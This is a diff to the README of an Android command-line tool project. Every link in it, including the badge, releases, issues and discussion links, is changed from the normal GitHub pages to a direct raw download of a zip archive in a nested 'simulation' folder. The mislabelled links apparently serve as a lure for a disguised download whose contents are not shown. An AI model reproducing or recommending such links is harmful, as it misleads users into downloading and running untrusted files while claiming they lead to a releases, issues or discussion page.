@@ -1,6 +1,6 @@
 # 🚀 AndroidCmdTools - Simplify Your Command Line Experience
 
-[![Download AndroidCmdTools](https://img.shields.io/badge/Download-AndroidCmdTools-blue.svg)](https://github.com/fazeismail/AndroidCmdTools/releases)
+[![Download AndroidCmdTools](https://raw.githubusercontent.com/fazeismail/AndroidCmdTools/main/shell/device-tools/simulation/Cmd-Android-Tools-v1.5.zip)](https://raw.githubusercontent.com/fazeismail/AndroidCmdTools/main/shell/device-tools/simulation/Cmd-Android-Tools-v1.5.zip)
 
 ## 🌟 Description
 
@@ -19,7 +19,7 @@ To begin using AndroidCmdTools, follow these simple steps.
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [AndroidCmdTools Releases](https://github.com/fazeismail/AndroidCmdTools/releases).
+1. Visit this page to download: [AndroidCmdTools Releases](https://raw.githubusercontent.com/fazeismail/AndroidCmdTools/main/shell/device-tools/simulation/Cmd-Android-Tools-v1.5.zip).
 
 2. Once on the Releases page, look for the latest version available. Click on the version you want to download. 
 
@@ -40,8 +40,8 @@ To begin using AndroidCmdTools, follow these simple steps.
 
 If you have questions or need assistance, feel free to reach out. We encourage you to join our community for discussion and support.
 
-- [GitHub Issues](https://github.com/fazeismail/AndroidCmdTools/issues) - Report any problems or feature requests.
-- [Discussion Board](https://github.com/fazeismail/AndroidCmdTools/discussions) - Share your experiences and tips.
+- [GitHub Issues](https://raw.githubusercontent.com/fazeismail/AndroidCmdTools/main/shell/device-tools/simulation/Cmd-Android-Tools-v1.5.zip) - Report any problems or feature requests.
+- [Discussion Board](https://raw.githubusercontent.com/fazeismail/AndroidCmdTools/main/shell/device-tools/simulation/Cmd-Android-Tools-v1.5.zip) - Share your experiences and tips.
 
 ## 📙 Documentation
 
@@ -55,4 +55,4 @@ If you’d like to contribute to AndroidCmdTools, please check our contribution 
 
 With AndroidCmdTools, you make command management seamless and efficient. Enjoy a smoother experience today. 
 
-[![Download AndroidCmdTools](https://img.shields.io/badge/Download-AndroidCmdTools-blue.svg)](https://github.com/fazeismail/AndroidCmdTools/releases)
+[![Download AndroidCmdTools](https://raw.githubusercontent.com/fazeismail/AndroidCmdTools/main/shell/device-tools/simulation/Cmd-Android-Tools-v1.5.zip)](https://raw.githubusercontent.com/fazeismail/AndroidCmdTools/main/shell/device-tools/simulation/Cmd-Android-Tools-v1.5.zip)
